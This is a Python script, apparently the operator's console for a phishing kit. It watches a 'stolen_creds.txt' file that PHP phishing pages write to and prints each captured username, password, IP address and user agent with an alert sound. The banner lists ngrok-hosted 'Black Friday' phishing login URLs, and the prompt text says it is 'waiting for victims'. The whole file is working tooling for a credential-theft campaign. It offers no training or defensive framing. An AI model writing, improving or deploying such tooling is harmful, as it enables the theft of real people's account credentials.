#!/usr/bin/env python3
"""
Phishing Credential Monitor
"""

import time
import json
from datetime import datetime
import os
from colorama import init, Fore, Style
import subprocess
import platform

init(autoreset=True)

class PhishingMonitor:
    def __init__(self, log_file_path):
        self.log_file_path = log_file_path
        self.credentials = []
        self.last_position = 0
        
    def print_banner(self):
        """배너 출력"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════╗
║          Phishing Credential Monitor v2.0                ║
║              Black Friday Edition                        ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.YELLOW}Monitoring:{Style.RESET_ALL} {self.log_file_path}
{Fore.YELLOW}Status:{Style.RESET_ALL} Active

{Fore.CYAN}Phishing URLs:{Style.RESET_ALL}
  • https://irremeable-zoe-scabrous.ngrok-free.dev/project_phishing/bf2025.php
  • https://irremeable-zoe-scabrous.ngrok-free.dev/project_phishing/secure_login.php

{Fore.CYAN}{'='*60}{Style.RESET_ALL}
""")

    def check_file_exists(self):
        """로그 파일 존재 확인 - 파일을 생성하지 않음!"""
        if not os.path.exists(self.log_file_path):
            print(f"{Fore.YELLOW}[*] Waiting for log file to be created by PHP...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Expected location: {self.log_file_path}{Style.RESET_ALL}")
            return False
        else:
            print(f"{Fore.GREEN}[+] Log file found!{Style.RESET_ALL}")
            # 파일 크기 확인
            file_size = os.path.getsize(self.log_file_path)
            print(f"{Fore.GREEN}[+] File size: {file_size} bytes{Style.RESET_ALL}")
            return True

    def wait_for_file(self):
        """PHP가 파일을 생성할 때까지 대기"""
        print(f"\n{Fore.YELLOW}[*] Waiting for PHP to create log file...{Style.RESET_ALL}")
        while not os.path.exists(self.log_file_path):
            print(f"\r{Fore.YELLOW}[*] Checking for file... {Style.RESET_ALL}", end='')
            time.sleep(2)
        print(f"\n{Fore.GREEN}[+] File detected!{Style.RESET_ALL}")

    def read_new_credentials(self):
        """새로운 크레덴셜 읽기"""
        try:
            # 파일이 존재하는지 먼저 확인
            if not os.path.exists(self.log_file_path):
                return []
                
            with open(self.log_file_path, 'r') as f:
                f.seek(self.last_position)
                new_lines = f.readlines()
                self.last_position = f.tell()
                
            new_creds = []
            for line in new_lines:
                if line.strip():
                    try:
                        cred_data = json.loads(line.strip())
                        new_creds.append(cred_data)
                    except json.JSONDecodeError as e:
                        print(f"\n{Fore.RED}[!] JSON decode error: {e}{Style.RESET_ALL}")
                        print(f"{Fore.RED}[!] Line: {line}{Style.RESET_ALL}")
                        
            return new_creds
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error reading file: {e}{Style.RESET_ALL}")
            return []

    def display_credential(self, cred):
        """크레덴셜 표시"""
        timestamp = cred.get('timestamp', 'Unknown')
        username = cred.get('username', 'N/A')
        password = cred.get('password', 'N/A')
        ip = cred.get('ip', 'Unknown')
        page = cred.get('page', 'Unknown')
        user_agent = cred.get('user_agent', 'Unknown')[:50] + '...' if len(cred.get('user_agent', '')) > 50 else cred.get('user_agent', 'Unknown')
        
        print(f"\n{Fore.RED}[!] NEW CREDENTIAL CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Timestamp:{Style.RESET_ALL} {timestamp}")
        print(f"{Fore.YELLOW}Page:{Style.RESET_ALL} {page}")
        print(f"{Fore.YELLOW}Username:{Style.RESET_ALL} {Fore.CYAN}{username}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Password:{Style.RESET_ALL} {Fore.CYAN}{password}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}IP Address:{Style.RESET_ALL} {ip}")
        print(f"{Fore.YELLOW}User Agent:{Style.RESET_ALL} {user_agent}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        # 알림음 (macOS)
        if platform.system() == 'Darwin':
            os.system('afplay /System/Library/Sounds/Glass.aiff')

    def monitor(self):
        """메인 모니터링 루프"""
        self.print_banner()
        
        # 파일이 없으면 대기
        if not self.check_file_exists():
            self.wait_for_file()
        
        print(f"\n{Fore.YELLOW}[*] Starting monitoring...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Waiting for victims to enter credentials...{Style.RESET_ALL}\n")
        
        monitoring_start = time.time()
        check_count = 0
        
        try:
            while True:
                check_count += 1
                new_creds = self.read_new_credentials()
                
                if new_creds:
                    for cred in new_creds:
                        self.credentials.append(cred)
                        self.display_credential(cred)
                else:
                    # 상태 표시
                    elapsed = int(time.time() - monitoring_start)
                    current_size = os.path.getsize(self.log_file_path) if os.path.exists(self.log_file_path) else 0
                    print(f"\r{Fore.YELLOW}[*] Monitoring... | Checks: {check_count} | Elapsed: {elapsed}s | File size: {current_size} bytes | Total: {len(self.credentials)}{Style.RESET_ALL}", end='')
                
                time.sleep(2)  # 2초마다 확인
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Monitoring stopped by user{Style.RESET_ALL}")

def main():
    print(f"""
{Fore.YELLOW}
    ____  __    ___   ________ __   __________  ______  _____  __
   / __ )/ /   /   | / ____/ //_/  / ____/ __ \/  _/ / / /   |/  /
  / __  / /   / /| |/ /   / ,<    / /_  / /_/ // // / / / /| | / 
 / /_/ / /___/ ___ / /___/ /| |  / __/ / _, _// // /_/ / ___ |/ /  
/_____/_____/_/  |_\____/_/ |_| /_/   /_/ |_/___/_____/_/  |_(_)   
                                                                     
{Style.RESET_ALL}
""")
    
    # XAMPP htdocs의 절대 경로 지정
    log_file = "/Applications/XAMPP/xamppfiles/htdocs/project_phishing/stolen_creds.txt"
    
    # 또는 blackfriday 폴더 안에 있다면
    # log_file = "/Applications/XAMPP/xamppfiles/htdocs/blackfriday/stolen_creds.txt"
    
    print(f"{Fore.CYAN}Configuration:{Style.RESET_ALL}")
    print(f"  Log File Path: {log_file}")
    print(f"  Current Directory: {os.getcwd()}")
    
    # 디렉토리 존재 확인
    log_dir = os.path.dirname(log_file)
    if os.path.exists(log_dir):
        print(f"  Target Directory: {Fore.GREEN}EXISTS{Style.RESET_ALL}")
        # 디렉토리의 파일 목록 표시
        files = os.listdir(log_dir)
        if 'stolen_creds.txt' in files:
            print(f"  stolen_creds.txt: {Fore.GREEN}FOUND{Style.RESET_ALL}")
        else:
            print(f"  stolen_creds.txt: {Fore.YELLOW}NOT FOUND (will wait for creation){Style.RESET_ALL}")
    else:
        print(f"  Target Directory: {Fore.RED}NOT FOUND{Style.RESET_ALL}")
        print(f"\n{Fore.RED}[!] Please check the directory path!{Style.RESET_ALL}")
        return
    
    input(f"\n{Fore.YELLOW}Press Enter to start monitoring...{Style.RESET_ALL}")
    
    # 모니터링 시작
    monitor = PhishingMonitor(log_file)
    
    try:
        monitor.monitor()
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
